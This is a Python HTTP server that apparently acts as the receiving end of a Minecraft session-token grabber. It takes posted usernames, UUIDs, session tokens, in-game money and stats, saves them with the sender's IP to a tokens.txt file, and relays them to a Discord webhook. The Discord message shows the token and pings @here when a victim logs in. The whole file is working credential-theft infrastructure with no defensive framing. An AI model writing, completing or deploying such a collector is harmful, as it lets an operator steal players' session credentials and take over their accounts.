from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import urllib.request
import urllib.error
import os
import time
from collections import defaultdict

# =========== RATE LIMITING ===========
REQUEST_LOG = defaultdict(list)  # Tracks requests per IP
MAX_REQUESTS = 2  # Maximum 2 requests
TIME_WINDOW = 900  # 15 minutes in seconds (15 * 60)
BLOCKED_IPS_FILE = "blocked_ips.txt"
IP_LOG_FILE = "ip_log.txt"

def check_rate_limit(ip):
    """Check if IP exceeds rate limit (2 requests per 15 minutes)"""
    current_time = time.time()
    
    # Clean old requests (older than 15 minutes)
    REQUEST_LOG[ip] = [t for t in REQUEST_LOG[ip] if current_time - t < TIME_WINDOW]
    
    # Check if exceeds limit
    if len(REQUEST_LOG[ip]) >= MAX_REQUESTS:
        print(f"🚨 RATE LIMIT EXCEEDED: {ip} - Blocked for 15 minutes")
        
        # Log blocked IP
        with open(BLOCKED_IPS_FILE, 'a') as f:
            f.write(f"{ip} | {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        
        return False  # Block this request
    
    # Add this request to log
    REQUEST_LOG[ip].append(current_time)
    return True  # Allow this request

def log_ip(ip, username, server):
    """Log all IPs that connect"""
    with open(IP_LOG_FILE, 'a') as f:
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        f.write(f"{timestamp} | {ip} | {username} | {server}\n")

# =========== CONFIG LOADING ===========
def load_config():
    try:
        with open('config.json', 'r') as f:
            config = json.load(f)
            return config
    except FileNotFoundError:
        print("❌ ERROR: config.json not found!")
        print("Create config.json with: {\"discord_webhook\": \"YOUR_WEBHOOK\"}")
        exit(1)
    except json.JSONDecodeError:
        print("❌ ERROR: Invalid config.json!")
        exit(1)

# Load webhook from config file
config = load_config()
DISCORD_WEBHOOK = config.get('discord_webhook')

if not DISCORD_WEBHOOK:
    print("❌ ERROR: discord_webhook not found in config.json!")
    exit(1)

print("✅ Config loaded")
# ======================================

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            # Get client IP
            client_ip = self.client_address[0]
            print(f"📨 Request from IP: {client_ip}")
            
            # Check rate limit
            if not check_rate_limit(client_ip):
                self.send_response(429)  # Too Many Requests
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write(b'Rate limit exceeded: 2 requests per 15 minutes')
                return
            
            length = int(self.headers['Content-Length'])
            data = json.loads(self.rfile.read(length).decode())
            
            username = data.get('username', 'Unknown').strip()
            uuid = data.get('uuid', '').strip()
            server = data.get('server', '').strip()
            token = data.get('token', '').strip()
            money = data.get('money', '0').strip()
            playtime = data.get('playtime', '0h').strip()
            kills = data.get('kills', '0').strip()
            deaths = data.get('deaths', '0').strip()
            skin = data.get('skin', '').strip()
            log_type = data.get('type', 'login').strip()
            
            print(f"Got: {username} on {server}")
            
            # Log IP
            log_ip(client_ip, username, server)
            
            with open('tokens.txt', 'a') as f:
                f.write(f"{username} | {uuid} | {server} | {token} | {money} | {playtime} | {kills} | {deaths}\n")
            
            # Discord webhook
            try:
                headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
                is_login = log_type.lower() == "login"
                
                description = f"**Username:** `{username}`\n**UUID:** `{uuid}`\n**Server:** `{server}`"
                
                if money and money != "0":
                    description += f"\n**Money:** `{money}`"
                if playtime and playtime != "0h":
                    description += f"\n**Playtime:** `{playtime}`"
                if kills and kills != "0":
                    description += f"\n**Kills:** `{kills}`"
                if deaths and deaths != "0":
                    description += f"\n**Deaths:** `{deaths}`"
                
                if is_login and token:
                    description += f"\n\n🔑 **Session Token:**\n||`{token}`||"
                
                embed = {
                    "title": "✅ User Connected" if is_login else "❌ User Disconnected",
                    "color": 5763719 if is_login else 15548997,
                    "description": description
                }
                
                if skin:
                    embed["thumbnail"] = {"url": skin}
                elif uuid:
                    embed["thumbnail"] = {"url": f"https://mc-heads.net/head/{uuid.replace('-', '')}"}
                
                content = None
                if is_login:
                    if money and money != "0":
                        content = f"@here Money: ||{money}||"
                    else:
                        content = "@here"
                
                payload = {
                    "content": content,
                    "embeds": [embed],
                    "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
                }
                
                req_data = json.dumps(payload).encode('utf-8')
                req = urllib.request.Request(DISCORD_WEBHOOK, data=req_data, headers=headers)
                response = urllib.request.urlopen(req, timeout=10)
                print(f"✅ Sent to Discord")
                
            except urllib.error.HTTPError as e:
                print(f"❌ Discord error: {e.code}")
            except Exception as e:
                print(f"❌ Discord error: {e}")
            
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'OK')
            
        except Exception as e:
            print(f"❌ Error: {e}")
            self.send_response(500)
            self.end_headers()
    
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b'Server running - Rate limit: 2 requests per 15 minutes per IP')
    
    def log_message(self, format, *args):
        # Log IP with each request
        client_ip = self.client_address[0]
        print(f"{self.log_date_time_string()} - {client_ip} - {args[0]}")

print("🚀 Server starting on port 5000")
print("📊 Rate limit: 2 requests per 15 minutes per IP")
server = HTTPServer(('0.0.0.0', 5000), Handler)
server.serve_forever()
